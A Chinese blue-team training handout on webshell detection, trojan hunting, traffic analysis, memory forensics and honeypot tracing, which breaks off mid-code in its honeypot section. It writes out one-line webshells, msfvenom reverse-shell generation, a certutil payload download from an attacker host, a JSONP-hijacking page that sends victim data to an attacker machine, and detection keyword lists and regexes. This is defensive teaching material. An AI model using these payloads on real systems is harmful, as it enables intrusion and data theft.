---
title: 网络安全攻防演练 · 护网行动蓝队培训讲义
date: "2026-08-04T21:02:08+08:00"
draft: false
description: 
tags: []
categories: []
ShowToc: true
TocOpen: true
---

---

## 目录
1. [护网行动与红蓝对抗基础](#一护网行动与红蓝对抗基础)
2. [蓝队防守体系建设](#二蓝队防守体系建设)
3. [网站木马（Webshell）排查](#三网站木马webshell排查)
4. [系统木马后门排查](#四系统木马后门排查)
5. [流量分析（上）：工具与基础](#五流量分析上工具与基础)
6. [流量分析（下）：恶意流量识别与溯源](#六流量分析下恶意流量识别与溯源)
7. [电子取证分析（内存取证）](#七电子取证分析内存取证)
8. [蜜罐溯源](#八蜜罐溯源)
9. [钓鱼攻击识别与反制溯源](#九钓鱼攻击识别与反制溯源)
10. [附录：蓝队速查手册](#附录蓝队速查手册)
11. [实战练习：四个流量包分析](#实战练习四个流量包分析)

---

## 一、护网行动与红蓝对抗基础
### 1.1 网络安全与法律底线
**网络安全**：保护计算机、网络、软件应用程序、关键系统和数据免受潜在数字威胁的做法。落地靠三件事——**人员、流程、技术**。

干活前必须知道法律边界，下面 4 部法规是防守、上报、取证的法律依据：

| 法规 | 作用 |
| --- | --- |
| 《网络安全法》 | 网络安全基本法 |
| 《数据安全法》 | 数据处理与安全 |
| 《关键信息基础设施安全保护条例》 | 关基保护 |
| 《反间谍法》 | 防窃密、防渗透 |


> 提醒：任何未授权的扫描、入侵、公开厂商漏洞都是违法行为。护网是**授权**演练，日常学习只能在靶场或授权范围内进行。
>

### 1.2 红蓝对抗
**红蓝对抗（Red Team vs Blue Team）**：模拟攻击和防御，用于测试系统、网络、应用的安全性。

+ **红队＝攻击方**：利用漏洞和技术入侵系统，获取敏感信息或控制权。
+ **蓝队＝防守方**：监测、检测攻击，并采取措施保护系统。

**选红队还是蓝队？**

+ 单看 HW 人才需求量：**蓝队 > 红队**。
+ 国家级 HW 对红队技术门槛更高。
+ 安全防御方向（蓝队相关）：企业安全建设、等保测评、安全开发、安全设备运营；安全防御类比赛占比日益增长，岗位多。

### 1.3 护网行动（HW）与重保
| 类型 | 说明 |
| --- | --- |
| **国家 HW** | 每年一次，由**公安部**组织，持续约 **14 天** |
| 其他 HW | 次数多：省级单独开展；地区联合（华东、川渝、长三角等）；行业内部演练（三大运营商、银行、电网等） |
| **重保** | 重要时期安全保障：冬奥会、亚运会、二十大、两会等 |


### 1.4 ATT&CK 攻击框架
+ 中文版：`https://github.com/NomadCN112/Chinese-translation-ATT-CK-framework`
+ **是什么**：MITRE 提出的「对抗战术、技术和常识」（Adversarial Tactics, Techniques, and Common Knowledge），由 **12 种战术、244 种企业技术**组成的知识库。
+ **对蓝队的价值**：告诉你"攻击者会怎么做、你该监控哪些系统、从哪里收集什么数据"。研判告警、写检测规则、做溯源报告都按 ATT&CK 来归类。

### 1.5 护网行动的 5 步流程
1. **准备及调研**：安全厂商牵头，制定方案、用户沟通、设备调研、整体防护情况梳理、**资产清单收集**。
2. **风险自查及修复**（蓝队进场，最核心的一步），共 9 项：
    - 互联网资产扫描
    - 漏洞扫描
    - 渗透测试
    - 安全基线 / 配置核查
    - 安全设备策略检查
    - 日志审计情况检查
    - 防护设备完善
    - 之前安全事件的复核
    - 安全整改加固
3. **攻防预演习**：甲方组织的小型演练，内部人员或合作厂商充当红队，发现问题并修复。
4. **正式演练**：分组、分工、明确职责（用户 + 安全设备厂商 + 业务开发商 + 运维厂商）。
5. **工作总结**：一般由厂商项目经理负责。

### 1.6 蓝队的职责
依据监测到的安全事件，做四件事：**追踪溯源、应急处置、安全加固、安全防护**。

---

## 二、蓝队防守体系建设
### 2.1 总方针
**攻防前未雨绸缪，平日里下足功夫。** 完整链条：

```plain
前期资产梳理、安全排查
    → 日常员工安全意识培训
    → 规范化的安全管理与运营
    → 软硬件安全防护体系建设
    → 被攻击时完善的应急响应流程
```

### 2.2 资产梳理（防守第一步）
先把家底摸清，形成**资产清单**。清单必须包含：

> **IP 地址、操作系统、中间件、应用软件、域名、端口、服务、责任人、联系方式**
>

目的：出事时能**快速资产定位、风险处置、应急**。连有哪些资产都不知道，就无从防守。

### 2.3 安全意识（防社工 / 钓鱼——护网最高频失分点）
正面打不进来时，攻击方会用**社工、钓鱼、近源渗透**。

**钓鱼邮件攻击链（3 步）**：

1. 攻击者通过**信息收集或爆破邮箱**获取目标邮箱账号；
2. 用拿到的（往往是内部）邮箱，**有选择地发送钓鱼邮件**；
3. 骗取**账号密码**或**投放木马程序**。

**为什么容易中招**：钓鱼邮件来自**内部邮箱**、内容精心伪造，人极易被诱骗点开链接或附件。

**后果**：关键终端被控，甚至整个网络沦陷。

> 防范要点：不点陌生链接、不乱开附件、账号密码不输入到非官方页面、异常邮件先核实发件人。技术层面的分析见第九章。
>

### 2.4 安全运营
为维护和保护网络系统安全进行的一系列活动，覆盖**规划、实施、监控、响应**，目标是保证 **CIA 三元组**：

+ **机密性（Confidentiality）**
+ **完整性（Integrity）**
+ **可用性（Availability）**

### 2.5 安全防护（设备与厂商）
企业安全建设离不开网络安全设备（防火墙、IPS/IDS、WAF、态势感知、EDR 等）。主流厂商参考：

+ 绿盟：`https://www.nsfocus.com.cn/`
+ 启明星辰：`https://www.venustech.com.cn/`
+ 深信服：`https://www.sangfor.com.cn/`

### 2.6 技战法
护网里指从战略到战术的一系列防守策略组合（情报、资源调度、组织协同等）。可参考长亭防守技战法案例学习思路。

### 2.7 知己知彼：红队常见攻击手法（蓝队防范清单）
红队主要用**渗透测试**模拟黑客攻击，同时采用 **APT 类似攻击方法**：短时间内做资产指纹、漏洞、端口扫描，分析后快速渗透。手法分类：

| 手法 | 说明 |
| --- | --- |
| **漏洞攻击** | web 漏洞、服务漏洞、通用组件漏洞、**0day** |
| **钓鱼** | 邮件/IM 投递木马、骗取凭据 |
| **近源渗透** | 物理靠近、混入办公区、插入恶意 U 盘、连内网 Wi-Fi |
| **供应链攻击** | 篡改供应商产品、植入恶意代码，影响供应链的**完整性、保密性、可用性、可靠性** |


> 把这张表当作蓝队检测清单：每一种手法都要有对应的监测点和处置预案。
>

---

## 三、网站木马（Webshell）排查
### 3.1 Webshell 是什么
**Webshell = 网站后门**，攻击者上传后可通过它控制网站服务器。最经典的"一句话木马"：

```php
@eval($_POST['yijingnb']);
```

+ `$_POST['yijingnb']`：接收 POST 参数 `yijingnb` 的值。
+ `eval()`：把字符串当 PHP 代码执行——这是后门的核心。
+ `@`：错误抑制符，隐藏报错，避免暴露。

**连接测试（理解攻击链）**：用蚁剑（AntSword）等 Webshell 管理工具，或直接 curl：

```bash
curl -X POST http://靶机地址/yijing_cybersecurity.php -d 'yijingnb=system("cat /etc/passwd");'
```

> 蚁剑三大功能：添加数据、文件管理、命令执行。文档：`https://www.yuque.com/antswordproject/antsword/`
>

### 3.2 PHP Webshell 分类与特征（静态查杀的核心）
按"代码执行函数"分类，查杀时**下面这些函数全部要匹配**：

```php
@eval($_POST['a']);                              // eval 型
@assert($_POST['a']);                            // assert
$st = @create_function('', $_POST['a']); $st();  // create_function
@preg_replace('/.*/e', $_POST['a'], '');         // preg_replace 的 /e 修饰符
@preg_filter('/.*/e', $_POST['a'], '', '');      // preg_filter
@mb_ereg_replace('.*', $_POST['a'], '', 'ee');   // mb_ereg_replace 的 ee
$_POST['a']($_POST['b']);                        // 动态函数调用 $a($b)
```

> 高危关键词：`eval`、`assert`、`create_function`、`preg_replace`+`/e`、`preg_filter`、`mb_ereg_replace`+`ee`、动态函数调用、`base64_decode`、`file_put_contents`、`system`、`shell_exec`、`passthru`。
>

**哥斯拉（Godzilla）型——流量加密**，关键签名：

+ 密钥常量：`$T = '3c6e0b8a9c15224a';`
+ 参数名：`pass`、`payload`；数据通过 `$_SESSION['payload']` 持久化；
+ 自定义函数做 XOR / base64 编解码；
+ 响应体两侧带 MD5 标记：`substr(md5($P.$T),0,16)` … `substr(md5($P.$T),16)`。

**冰蝎（Behinder）型——AES 加密**，关键签名：

+ 首次请求生成密钥 `substr(md5(uniqid(rand())),16)` 存入 `$_SESSION['k']`；
+ 后续从 `php://input` 读密文；
+ 优先 `openssl_decrypt($data,"AES128",$key)`；openssl 不可用时退化为 XOR；
+ 最终 `call_user_func` 执行。

> 哥斯拉/冰蝎共性：**session 传密钥 + php://input 取包 + base64/AES/XOR + 响应体带 md5 标记**。在 access.log 里表现为"反复 POST 同一文件、响应体明显偏大、UA 异常"。
>

### 3.3 ASP / ASPX / Java Webshell 特征
**ASP**（VBScript/JScript）：

```plain
<%eval request("abc")%>
<%execute request("abc")%>
<%executeglobal request("abc")%>
```

> 关键词：`eval request`、`execute request`、`executeglobal request`。
>

**ASPX**（.NET）：

```plain
<%@ Page Language="Jscript"%><%eval(Request.Item["pass"],"unsafe");%>
```

> 关键词：`Language="Jscript"` + `eval(Request.Item[...])` + `"unsafe"`。
>

**Java（jsp/jspx）**：核心是 `Runtime.getRuntime().exec(...)` 执行命令。

+ jsp：表单传参 `cmd` → `Runtime.getRuntime().exec(cmd)` 回显。
+ jspx：`<jsp:scriptlet>` + `BASE64Decoder` 解码后执行。
+ 脚本引擎型：`ScriptEngineManager().getEngineByName("js").eval(...)`。

> 关键词：`Runtime.getRuntime().exec`、`BASE64Decoder`、`ScriptEngineManager`、`<jsp:scriptlet>`。
>

**内存马（无文件马，护网重点）**：不落地文件，寄生在中间件进程里执行恶意代码，**文件层面查不到**。参考：`https://github.com/4ra1n/shell-analyzer`（Java 内存马检测/查杀）。内存马要从中间件/JVM 内部排查。

### 3.4 Webshell 查杀
**(1) 自动审计工具**

| 工具 | 地址 |
| --- | --- |
| shellpub（河马） | `https://www.shellpub.com/` |
| D 盾（D_Web） | 配合 shellpub 使用 |
| 百度 WEBDIR+ | `https://scanner.baidu.com/#/pages/intro` |
| 长亭 webshell 检测 | `https://stack.chaitin.com/security-challenge/webshell/index` |


> 自动查杀并不总靠谱，**必须配合手动排查**。
>

**(2) 手动排查——Web 日志审计（核心）**

可疑日志特征（蓝队判据）：

```plain
GET  /yijing_cybersecurity.php  200  146        ← 首次访问落地
POST /yijing_cybersecurity.php  200  26354      ← 大响应体
POST /yijing_cybersecurity.php  200  617        ← 反复 POST 同一文件
POST /yijing_cybersecurity.php  200  360  UA="...Firefox/22.0"   ← 异常/伪造 UA
```

**三判据**：① 同一文件被高频 POST；② 响应体明显偏大；③ User-Agent 异常/伪造/多变。

统计"源 IP + 文件 + 次数"：

```bash
cat access.log | awk '{print $1 $7}' | sort | uniq -c | sort -nr
```

找访问次数最高的文件并自动查看其内容（拼 Web 根目录）：

```bash
cat access.log | awk '{print $7}' | sort | uniq -c | sort -nr | head -n 1 \
 | awk '{print $2}' | sed 's/^/\/var\/www\/html/' | xargs cat
```

**(3) 手动排查——文件分析**

打包对比法（与备份比对，发现新增/篡改）：

```bash
tar -czvf www_now.tar ./*
diff <(tar -tf www.tar) <(tar -tf www_now.tar)
```

按修改时间排序（定位攻击时间窗口内被改的文件）：

```bash
ls -lt --time-style="+%Y-%m-%d %H:%M:%S" /var/www/html/ | head -10 | awk '{print $6, $7, $8}'
```

敏感函数/特征字符串匹配（**静态查杀核心命令**，关键词全保留）：

```bash
find /var/www/html/ -name "*.php" | xargs egrep \
 'assert|bash|system|phpspy|c99sh|milw0rm|eval|\(gunerpress|\(base64_decode|spider_bc|shell_exec|passthru|\(\$\_\POST\[|eval\(|file_put_contents|base64_decode'
```

目录结构审视：

```bash
tree /var/www/html/
```

> 注意隐藏文件：以 `.` 开头的文件（如 `.a.php`）普通 `ls` 看不到，要用 `ls -la`。
>

---

## 四、系统木马后门排查
### 4.1 常见病毒分类
**(1) 远控木马（红队最常用，护网重点排查）**

由 **Metasploit、CobaltStrike** 等 C2 生成的可执行文件（exe / elf / apk / macho）。传播方式：① 文件上传 + 命令执行（主动）；② 钓鱼下载 + 诱导执行。执行后**反连**黑客服务器，可开摄像头、截屏、管文件、装软件。

蓝队要理解攻击链（才能写检测规则），以 Metasploit 为例：

```bash
# Kali 生成 exe 后门
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<Kali地址> lport=9999 -f exe -o test.exe

# Kali 开监听（在 msf6 > 下）
handler -p windows/x64/meterpreter/reverse_tcp -H <Kali地址> -P 9999

# Kali 起 HTTP 服务传文件（注意是 shell 命令，不要在 msf6 > 里敲）
python3 -m http.server 10000
```

受害机用 certutil 下载（**高频落地手法，重点监控**）：

```plain
certutil -urlcache -split -f http://<Kali地址>:10000/test.exe
```

meterpreter 拿到 shell 后的典型操作：`sessions 1` 进会话 → `hashdump` 抓密码哈希 → `screenshot` 截屏。

**(2) 勒索病毒**：加密用户数据勒索赎金。特点：**加密难恢复、来源难追踪**。

**(3) 挖矿木马**：植入后 **CPU/GPU 占用率高达 90% 以上**，且有**大量对外网络连接**。常见：xmrig 等。

**(4) 红队遗留软件**：红队上传的攻击工具或开放监听/下载端口的服务，护网清场时重点清理。

### 4.2 排查病毒的四个维度
**① 相关路径排查**

Windows 重点目录：

```plain
C:\Windows\Temp
C:\Users\[user]\AppData\Local\Temp
C:\Users\[user]\Desktop
C:\Users\[user]\Downloads
C:\Users\[user]\Pictures
```

Linux：`/tmp`

**② 修改时间排查**：结合文件修改时间，定位攻击时间窗口内新建/被改的文件（见 3.4 命令）。

**③ 可疑计划任务排查**：挖矿/远控常用计划任务持久化。检查 Windows 计划任务、Linux `crontab -l` / systemd timer。

**④ 可疑进程排查**：高 CPU/GPU 占用、无数字签名、伪装系统进程名、对外异常连接的进程。

### 4.3 查杀病毒
1. **杀毒软件**本地查杀；
2. **在线病毒检测**：
    - VirusTotal：`https://www.virustotal.com/gui/home/upload`
    - VirSCAN：`https://www.virscan.org/`
    - 腾讯哈勃：`https://habo.qq.com/`
    - Internxt：`https://internxt.com/zh/virus-scanner`
3. **在线沙箱**：
    - FreeBuf 麦克云沙箱：`https://mac-cloud.riskivy.com/detect?theme=freebuf`
    - 微步在线威胁情报沙箱：`https://s.threatbook.com/`

### 4.4 勒索病毒处置五步法
**(1) 判断病毒**——根据勒索信息分型：加密勒索 / MBR 引导勒索 / web 服务器勒索 / 安卓勒索；同时看被加密文件（扩展名被改、打不开）和被篡改的桌面背景。

**(2) 解密工具**（先查官方解密库，勿急于付赎金）：

+ 深信服 EDR 勒索查询：`https://edr.sangfor.com.cn/#/information/ransom_search`
+ NoMoreRansom：`https://www.nomoreransom.org/zh/index.html`

**(3) 解密问题（真假加密）**：真实加密用高强度算法，**没有作者密钥无法解密**。历史技术突破案例：

+ 编写者犯执行错误被破解：**Petya、CryptXXX**
+ 编写者内疚主动公布密钥：**TeslaCrypt**
+ 执法机构搜获服务器并共享密钥：**CoinVault**

**(4) 获取密钥（付费风险）**：第三方服务商本质是**中介**，不具备技术破解能力。**不建议直接付赎金**，三大风险：① 工具不能用；② 密钥不对；③ 黑客多次索要。若联系第三方：**务必签合同**，明确"解密不成功是否付款"；**不要咨询过多第三方**（会让黑客抬价）。

**(5) 清除病毒**：格式化/重装/恢复系统；删除可疑文件（**先打包成加密压缩包再删，便于取证**）；清除勒索信息和加密文件（注意影响后续恢复）；恢复备份。

---

## 五、流量分析（上）：工具与基础
### 5.1 Wireshark 基础
**Wireshark**（前称 Ethereal）：网络封包分析软件，截取封包并显示最详细资料，用 **WinPCAP / Npcap** 与网卡交换数据。Windows 安装必须勾选 **Npcap**。

**Wireshark 与 Burp Suite 的区别（研判必记）**：

| 工具 | 抓取协议 | 能否改包 | 定位 |
| --- | --- | --- | --- |
| **Burp Suite** | http / https / ws | 可以 | 中间人 / Web 渗透 |
| **Wireshark** | TCP/IP 全协议 | 不能 | 流量分析 |


### 5.2 两大过滤器（核心，绝不能混用）
> **捕获过滤器**＝抓包前过滤（BPF 语法，省空间）；**显示过滤器**＝抓包后过滤（Filter 框，不丢数据）。两者语法不同。
>

**(1) 捕获过滤器（BPF）**

+ 语法：`Type`（host/net/port）+ `Dir`（src/dst）+ `Proto`（ip/tcp/udp/http/icmp）+ 逻辑符（`&&` `||` `!`）

```latex
host 192.168.1.104              # 该主机
src host 192.168.1.104          # 源为该主机
dst port 80                     # 目的端口 80
src host 192.168.1.104 && dst port 80
host 192.168.1.104 || host 192.168.1.102
!broadcast
```

**(2) 显示过滤器（Filter 框）**

+ 比较符：`==` `!=` `>` `<` `>=` `<=`；逻辑符：`and` `or` `not`（注意与捕获过滤器的 `&&/||/!` 不同）；协议名**必须小写**。

```latex
tcp                                    # 协议过滤
ip.src == 192.168.1.104                # 源地址
ip.addr == 192.168.1.104               # 源或目的
tcp.port == 80
http.request.method == "GET"
http.cookie == "PHPSESSID=qrq6mlhdvh4nn4j54ae77hde70"
ip.addr == 192.168.1.104 and icmp
```

### 5.3 包分析与文件提取
+ **ICMP**：测连通性，命令 `ping host/ip`，主动 ping 触发后抓包。
+ **HTTP**：过滤 `http` 后，**右键 → 追踪流（Follow → HTTP Stream）** 还原完整请求/响应。

**从流量中提取/恢复文件（3 种方法）**：

| 方法 | 适用 | 注意 |
| --- | --- | --- |
| Media type 获取 | 整体上/下载 | 分段上下载**不可用** |
| 原始数据获取（追踪流另存） | 万能 | 另存文件多出 HTTP 头，需手动剔除，或用 `binwalk --dd="zip" 111.zip` 提取 |
| 导出对象（File → Export Objects） | 仅下载 | Wireshark 自动识别**可能不准** |


### 5.4 tcpdump（命令行抓包）
语法：`tcpdump [option] [proto] [type] [direction]`

```bash
tcpdump -i eth1                                  # 抓 eth1 所有流量
tcpdump -i eth1 host 192.168.80.128              # 指定主机
tcpdump -i eth1 host 192.168.80.128 and port 10881
tcpdump port 80 or 8080
tcpdump portrange 1-1024
tcpdump -n src host 192.168.80.129 and dst port 3389
tcpdump -n 'src host 192.168.80.129 and (dst port 3389 or 22)'   # 注意括号和引号
tcpdump -n icmp
tcpdump -i eth1 host 192.168.80.129 and port 10881 -w test.pcap  # 导出 pcap 给 Wireshark

# 抓 Web 攻击常用：
tcpdump -vvAls0 | grep 'GET'    # 抓所有 GET
tcpdump -vvAls0 | grep 'POST'   # 抓所有 POST
```

`-vvAls0` 含义：`-vv` 更详细、`-A` ASCII 打印、`-l` 减少缓冲、`-s0` 捕获**完整**数据包。

---

## 六、流量分析（下）：恶意流量识别与溯源
### 6.1 网站攻击与扫描器流量
网站攻击关注三要素：**请求 URL、请求参数、User-Agent**。常见工具：**dirsearch**（目录爆破）、**sqlmap**（SQL 注入）。

**AWVS（Acunetix）扫描器识别特征**——参数 / UA / Content-Type 中含以下任一关键字即高疑：

```plain
test、testing、wvs、acunetix、acunetix_wvs、acunetix_wvs_security_test
```

### 6.2 Webshell 管理工具流量
**蚁剑（AntSword）**：**明文传输**。即使加密编码，也有**密码协商过程**，且该过程同样有明文——这是检测切入点。

**冰蝎（Behinder）**：2.0/3.0/4.0 流量特征有差异，研判需区分版本。弱特征：

+ 固定 UA 池（一批固定的浏览器 UA）；
+ 请求体头部字节与响应体头部字节**不变**；
+ Referer 文件名随机但**纯大写或纯小写**。

**哥斯拉（Godzilla）**：建连初期**同一 TCP 连接**内依次出现三个固定行为（强指纹）：

1. 发 payload，**HTTP 响应为空**；
2. 发 test，**执行结果为固定内容**；
3. 发 getBasisInfo。

其他特征：**Cookie 结尾带 **`;`；响应体前 16 位 + 后 16 位组成 32 位 MD5，正则：

```plain
(?i:[0-9A-F]{16})[\w+/]{4,}=?=?(?i:[0-9A-F]{16})
```

> 哥斯拉流量**无密钥无法解密**。
>

### 6.3 C2 远控流量
**Metasploit（meterpreter）**：命令执行已加密，看不到明文。但每个数据包**含 MZ 标头和 DOS 模式异常**（因 payload 携带 PE 文件特征）。

**CobaltStrike（CS）**：

+ **checksum8 规则**：下载 stage 的 URI 满足 **路径各字符 ASCII 之和 % 256 == 92**，这是 CS 最经典的识别点。
+ **Sleep 心跳**：无任务时**规律请求响应间隔**（如固定 3 秒）。
+ **任务下发**：经**心跳请求的返回包**下发。
+ **结果回传**：用 **POST** 方法。

### 6.4 攻击链溯源实战（DVWA + sqlmap + 后门 + C2）
蓝队"从流量还原攻击链"的标准动作：

1. **攻击源**：黑客 IP `192.168.80.129`。
2. **Web 入口**：访问 DVWA，用**默认密码 **`admin/password` 登录。
3. **扫描利用**：sqlmap 扫 `http://192.168.80.128/dvwa/vulnerabilities/sqli/`。
4. **SQL 注入**：`--dbs` 获取数据库名。
5. **写后门**：sqlmap os-shell 用 MySQL `into outfile` 写入 PHP 后门。
6. **后门内容**：
    - `tmpurpoy.php`：sqlmap 自带文件上传器（含 `sqlmap file uploader` 字样，上传后 `chmod 0755` 回显 `File uploaded`）。
    - `tmpbhlwo.php`：命令执行 webshell，参数 `$_REQUEST["cmd"]`；**绕过 disable_functions**（读 `disable_functions` → 拆分）；**执行函数回退链**：`system → proc_open → shell_exec → passthru → popen → exec`。
7. **后门执行的命令**（横向行为）：

```plain
whoami
net user
dir
certutil -urlcache -split -f http://192.168.80.129:10000/test.exe   ← 外联下载样本
test.exe
```

8. **样本落地**：下载执行 `test.exe`，检测为病毒。
9. **C2 确认**：运行后 TCP 流量显示**反连 **`192.168.80.129:9999`** 端口**，**C2 为 Metasploit**。

**溯源要点**：默认凭据 → sqlmap 注入 → `into outfile` 落地 webshell → disable_functions 绕过 → certutil 拉样本 → 固定端口反连 C2。

### 6.5 流量研判实战要点（过滤表达式备查）
```latex
# 从流量找网卡配置明文
tcp contains "inet addr"

# 抓登录成功 + POST（密码可能 AES 前端加密）
(http contains "{\"success\":true}" or http.request.method=="POST") and ip.addr==192.168.94.59

# 搜特定明文
http contains "password"
```

### 6.6 误报判断与溯源标准步骤
**误报剔除原则**：

+ AWVS 特征字必须出现在**真实请求**的参数/UA/Content-Type 才算；单次出现且无后续利用降级处理。
+ Webshell 工具：单条 UA 命中不算强证据，需叠加行为特征（冰蝎：UA + 头部字节不变 + Referer 大小写；哥斯拉：三段顺序 + Cookie 尾分号 + MD5 正则）。
+ C2 心跳：必须确认**规律性间隔** + URI 满足 checksum8 才判 CS；MSF 需确认 **MZ/PE 头**异常。

**攻击溯源标准 7 步**：定位攻击源 IP → 还原 Web 入口与凭据 → 识别扫描/利用工具 → 还原漏洞利用与后门落地 → 提取 webshell 样本与命令链 → 确认 C2 反连 → 输出攻击链时间线与 IOC（IP、端口、文件名、hash、UA、URI 规则）。

---

## 七、电子取证分析（内存取证）
### 7.1 取证前提
取证第一步是确认**法律授权与取证规范**，保证证据合法、完整、可追溯（证据链）。

### 7.2 Volatility 内存取证框架
**Volatility** 是最经典、功能最全的内存取证框架。Volatility 2 基于 Python 2，Volatility 3 为 Python 3 重写。Windows 10 推荐用 Volatility 3（`vol -f xxx.raw windows.*`），课件演示以 Volatility 2（python2 + 命令行）在 Kali 下操作。

**Kali 安装 Volatility 2**：

```bash
# 1. 装 pip2
wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
python2 get-pip.py

# 2. 克隆并安装
git clone https://ghproxy.com/https://github.com/volatilityfoundation/volatility.git
cd volatility && python2 setup.py install

# 3. 装依赖（清华镜像）
apt install python2-dev
pip2 install --upgrade setuptools -i https://pypi.tuna.tsinghua.edu.cn/simple
pip2 install pycryptodome -i https://pypi.tuna.tsinghua.edu.cn/simple
pip2 install yara -i https://pypi.tuna.tsinghua.edu.cn/simple
pip2 install distorm3 -i https://pypi.tuna.tsinghua.edu.cn/simple
pip2 install construct==2.5.5-reupload -i https://pypi.tuna.tsinghua.edu.cn/simple
ln -s /usr/local/lib/python2.7/dist-packages/usr/lib/libyara.so /usr/lib/libyara.so

# 4. 验证
python2 vol.py -h
```

### 7.3 内存取证 12 步标准流程
以镜像 `Challenge.raw`、Profile `Win7SP1x64` 为例。所有命令都依赖第 1 步识别出的正确 Profile。

```bash
# 1) 识别镜像信息 / 推荐 Profile（最关键，选错全错）
python2 vol.py -f ../Challenge.raw imageinfo

# 2) 进程列表（EPROCESS 双链表），定位可疑进程、记 PID/PPID
python2 vol.py -f ../Challenge.raw --profile=Win7SP1x64 pslist

# 3) 提取/转储指定进程（-p PID，-D 输出目录）
python2 vol.py -f ../Challenge.raw --profile=Win7SP1x64 procdump -p 520 -D ./

# 4) 控制台命令历史（还原攻击者敲过的命令）
python2 vol.py -f ../Challenge.raw --profile=Win7SP1x64 cmdscan

# 5) 进程命令行参数（比 cmdscan 更精确到进程）
python2 vol.py -f ../Challenge.raw --profile=Win7SP1x64 cmdline

# 6) 内存文件扫描 + 提取（grep 是 Linux 命令，管道过滤）
python2 vol.py -f ../Challenge.raw --profile=Win7SP1x64 filescan | grep hint.txt
python2 vol.py -f ../Challenge.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000011fd0ca70 -D ./   # -Q 物理偏移

# 7) IE 浏览历史（还原上网行为 / C2 下载地址）
python2 vol.py -f ../Challenge.raw --profile=Win7SP1x64 iehistory

# 8) 提取系统密码哈希（LM/NTLM，离线破解评估凭证强度）
python2 vol.py -f ../Challenge.raw --profile=Win7SP1x64 hashdump

# 9) 剪贴板内容
python2 vol.py -f ../Challenge.raw --profile=Win7SP1x64 clipboard

# 10) 扫描系统服务（发现隐藏/恶意服务，持久化常用）
python2 vol.py -f ../Challenge.raw --profile=Win7SP1x64 svcscan

# 11) 网络连接扫描（定位 C2 / 反弹 shell / 数据外传）
python2 vol.py -f ../Challenge.raw --profile=Win7SP1x64 netscan

# 12) 注册表：打印键值（枚举用户/SID，找克隆账号）+ 导出 hive
python2 vol.py -f ../Challenge.raw --profile=Win7SP1x64 printkey -K "SAM\Domains\Account\Users\Names"
python2 vol.py -f ../Challenge.raw --profile=Win7SP1x64 dumpregistry -D ./
```

### 7.4 Volatility 插件（按取证场景分类）
| 场景 | 关键插件 |
| --- | --- |
| 进程隐藏检测 | `psxview`（多视角）、`psscan`（池扫描）、`pstree`、`pslist` 对比，发现 DKOM 隐藏进程 |
| 注入 / rootkit 检测 | `malfind`（注入）、`apihooks`/`driverirp`（钩子）、`ssdt`/`idt`/`gdt`/`callbacks`（内核篡改） |
| 攻击者行为溯源 | `cmdscan`/`cmdline`（命令）、`userassist`/`amcache`/`shimcache`（程序执行记录）、`shellbags`（目录访问）、`iehistory`（上网）、`clipboard`/`notepad`（数据内容） |
| 凭证提取 | `hashdump`、`lsadump`、`cachedump`、`mimikatz` |
| 网络痕迹 | `netscan`、`connections`、`connscan`、`sockets` |
| 持久化 | `svcscan`（服务）、`printkey`（注册表自启） |
| 虚拟化取证 | `vmwareinfo`、`vboxinfo`、`qemuinfo` |


### 7.5 mimikatz 插件 + Strings
**mimikatz 插件**：把 `mimikatz.py` 放入 `volatility/plugins`，**直接从内存抓 Windows 明文密码/凭证**，无需在目标机运行 mimikatz：

```bash
python2 vol.py -f ../Challenge.raw --profile=Win7SP1x64 mimikatz
```

**Strings**：从镜像/二进制提取可打印字符串，配合关键字过滤发现线索（域名、IP、密码、路径）：

```bash
strings -n 8 Challenge.raw | grep -iE "key|pass|http"
```

---

## 八、蜜罐溯源
### 8.1 思路：用蜜罐"反咬"攻击者
护网里蓝队不只被动挨打。**蜜罐**是主动防御手段：布下一个诱饵，攻击者踩进来时，悄悄收集他的**身份信息**（QQ 号、手机号、邮箱、各平台 ID），从而**溯源到人**。

Web 蜜罐收集个人信息主要用两种技术：**JSONP 跨域劫持** 和 **XSS**。

### 8.2 前置：同源策略
**同源策略**（Netscape 提出）：限制从一个源加载的文档/脚本如何与另一个源的资源交互。**不同源**的客户端脚本，未授权不能读写对方资源（DOM、Cookie、第三方插件、XMLHttpRequest）。

**同源 = 协议（http/https）+ 端口 + host 三者完全一致**。

带 `src` 属性的标签**不受同源策略限制**：

```html
<script>, <img>, <link>, <iframe>
```

跨域被拦的演示（在 `freebuf.com` 页面用 XMLHttpRequest 请求 `baidu.com`）：

```javascript
var req = new XMLHttpRequest();
req.open("GET","https://www.baidu.com");
req.send();
// 报错：blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present
```

> 但如果目标网站存在跨域缺陷，同源策略就被打破，蜜罐就能利用它。
>

### 8.3 蜜罐怎么做
蜜罐要做的，就是**找到很多网站的跨域漏洞**，且这些漏洞能获取用户身份信息：**QQ 号、手机号、邮箱、百度 ID、微博 ID、google ID、搜狗 ID、360 ID、联想 ID、金山 ID** 等。

> ⚠️ 任何时候公开厂商漏洞均为违法行为，所以**开源蜜罐没有这个功能**。
>

如果踩到蜜罐的攻击者，其浏览器里**已经登录了这些网站**，蜜罐就能跨域拿到他的敏感信息，从而被溯源。

### 8.4 JSONP 劫持
**JSONP** 实现了数据的跨域访问。如果网站 B 对网站 A 的 JSONP 请求**不做安全检查直接返回数据**，则网站 B 存在 JSONP 漏洞，网站 A 能获取用户在 B 上的数据。

> 与 CSRF 的区别：CSRF 是**发送**数据达到目的；JSONP 劫持是**获取返回的敏感数据**。
>

JSONP 利用页面示例（攻击机准备接收）：

```html
<!-- hp_jsonp.html -->
<script>
function test(json){
  // 接收并处理跨域返回的用户数据
  fetch("http://攻击机:10002/?data=" + JSON.stringify(json));
}
</script>

<script src="存在jsonp漏洞的接口?callback=test"></script>

```

攻击机接收：

```bash
python3 -m http.server 10002
# 日志里会收到带 username/mobilephone/email 等字段的数据
```

### 8.5 JS 获取敏感信息 + navigator 对象（蜜罐采集点）
JS 可直接读取的信息（蜜罐常用）：

```javascript
document.cookie              // 当前页面 Cookie
window.location.href         // 当前访问 URL
window.location.pathname     // 当前访问路径
window.location.assign("http://xxxx")   // 加载新页面
```

**navigator 对象**（蜜罐采集攻击者浏览器/环境信息）：

```javascript
txt  = "<p>浏览器代号：" + navigator.appCodeName + "</p>";
txt += "<p>浏览器名称：" + navigator.appName + "</p>";
txt += "<p>浏览器版本：" + navigator.appVersion + "</p>";
txt += "<p>启用Cookies：" + navigator.cookieEnabled + "</p>";
txt += "<p>硬件平台：" + navigator.platform + "</p>";
